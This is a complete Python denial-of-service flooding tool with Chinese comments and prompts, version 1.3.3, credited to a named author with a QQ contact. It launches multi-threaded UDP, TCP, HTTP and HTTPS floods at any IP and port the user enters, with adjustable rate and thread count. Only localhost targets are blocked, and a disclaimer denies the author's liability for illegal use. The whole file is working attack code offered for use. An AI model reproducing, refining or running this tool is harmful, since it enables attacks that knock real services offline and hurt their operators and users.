import sys
import os
import time
import socket
import threading
import random
from datetime import datetime
import requests

version = '1.3.3'

# 获取当前时间
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# 全局变量
sent = 0

# 定义不同协议的攻击函数
def ddos_udp(arg, ip, port):
    global sent
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # 每个线程独立创建套接字
    bytes = random._urandom(1490)
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        print(f"\r线程{arg} 已发送 {sent} 个数据包到 {ip} 端口 {port}", end="")
        sys.stdout.flush()  # 确保输出立即刷新
        time.sleep((1000 - sd) / 2000)

def ddos_tcp(arg, ip, port):
    global sent
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 每个线程独立创建套接字
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            local_port = random.randint(1024, 65535)
            sock.bind(("0.0.0.0", local_port))
            sock.connect((ip, port))
            bytes = random._urandom(1490)
            sock.send(bytes)
            sent += 1
            print(f"\r线程{arg} 已发送 {sent} 个数据包到 {ip} 端口 {port}", end="")
            sys.stdout.flush()  # 确保输出立即刷新
            sock.close()
        except Exception as e:
            print(f"\r线程{arg} 连接失败: {e}", end="")
            sys.stdout.flush()  # 确保输出立即刷新
        time.sleep((1000 - sd) / 2000)

def ddos_http(arg, ip, port):
    global sent
    url = f"http://{ip}:{port}"  # HTTP 协议的 URL
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
    while True:
        try:
            response = requests.get(url, headers=headers, timeout=5)  # 增加超时时间
            if response.status_code == 200:
                sent += 1
                print(f"\r线程{arg} 已发送 {sent} 个请求到 {url}", end="")
                sys.stdout.flush()  # 确保输出立即刷新
        except requests.exceptions.Timeout:
            print(f"\r线程{arg} 请求超时，尝试重新发送...", end="")
            sys.stdout.flush()  # 确保输出立即刷新
        except Exception as e:
            print(f"\r线程{arg} 请求失败: {e}", end="")
            sys.stdout.flush()  # 确保输出立即刷新
        time.sleep((1000 - sd) / 2000)

def ddos_https(arg, ip, port):
    global sent
    url = f"https://{ip}:{port}"  # HTTPS 协议的 URL
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
    while True:
        try:
            response = requests.get(url, headers=headers, timeout=5)  # 增加超时时间
            if response.status_code == 200:
                sent += 1
                print(f"\r线程{arg} 已发送 {sent} 个请求到 {url}", end="")
                sys.stdout.flush()  # 确保输出立即刷新
        except requests.exceptions.Timeout:
            print(f"\r线程{arg} 请求超时，尝试重新发送...", end="")
            sys.stdout.flush()  # 确保输出立即刷新
        except Exception as e:
            print(f"\r线程{arg} 请求失败: {e}", end="")
            sys.stdout.flush()  # 确保输出立即刷新
        time.sleep((1000 - sd) / 2000)

# 主程序
print(" ")
print("/---------------------------------------------------\ ")
print("|   作者          : LELEXIAOLL                       |")
print("|   作者QQ        : 2037256099                       |")
print("|   版本          :",version,"                           |")
print("\---------------------------------------------------/")
print(" ")
print(" --------------------免责协议--------------------------")
print(" ")
print("1、如果使用者触犯法律，作者将不承担任何责任")
print("2、不允许将此脚本进行售卖，你如果是买来的赶紧去骂卖家死全家吧")
print(" ")
print("------------------------------------------------------")

while True:
    xy = input("是否同意此协议？(y/n)：")
    if xy == 'y':
        print("已同意协议，进入程序")
        print(" ")
        break
    elif xy == 'n':
        input("拒绝协议，请按下回车键退出程序...")
        sys.exit()
    else:
        print("请输入y/n")
    
print("--------------------",version,"更新内容------------------------")
print(" ")
print("1、继续修复TCP攻击端口占用问题")
print("2、将发送数据包输出至同一行")
print("3、将创建线程输出至同一行")
print("4、防止自己打自己")
print(" ")
print(" -----------------[请勿用于违法用途]----------------------- ")

# 选择攻击协议
protocol = input("请选择攻击协议 (UDP/TCP/HTTP/HTTPS): ").strip().upper()
while protocol not in ["UDP", "TCP", "HTTP", "HTTPS"]:
    print("无效的协议选择，请重新输入！")
    protocol = input("请选择攻击协议 (UDP/TCP/HTTP/HTTPS): ").strip().upper()

# 用户输入攻击目标和参数
while True:
    ip = input("请输入 IP: ")
    if ip == '127.0.0.1' or ip == '0.0.0.0' or ip == 'loaclhost':
        print('爱博士你在自己打自己嘞？')
        print('')
        continue
    else:
        break
port = int(input("攻击端口: "))
sd = int(input("攻击速度 (1~1000): "))
xc = int(input("请输入线程数 (线程数过高会卡): "))


# 创建线程列表
threads = []

# 创建线程
for i in range(xc):
    if protocol == "UDP":
        thread = threading.Thread(target=ddos_udp, args=(i + 1, ip, port))
    elif protocol == "TCP":
        thread = threading.Thread(target=ddos_tcp, args=(i + 1, ip, port))
    elif protocol == "HTTP":
        thread = threading.Thread(target=ddos_http, args=(i + 1, ip, port))
    elif protocol == "HTTPS":
        thread = threading.Thread(target=ddos_https, args=(i + 1, ip, port))
    threads.append(thread)
    print(f"\r创建线程 {i + 1} 中...", end="")
    sys.stdout.flush()  # 确保输出立即刷新

print("\n所有线程创建完毕")
time.sleep(1)
print("启动线程中...")
time.sleep(1)

# 启动线程
for i in range(xc):
    threads[i].start()
    print(f"\r线程 {i + 1} 已启动", end="")
    sys.stdout.flush()  # 确保输出立即刷新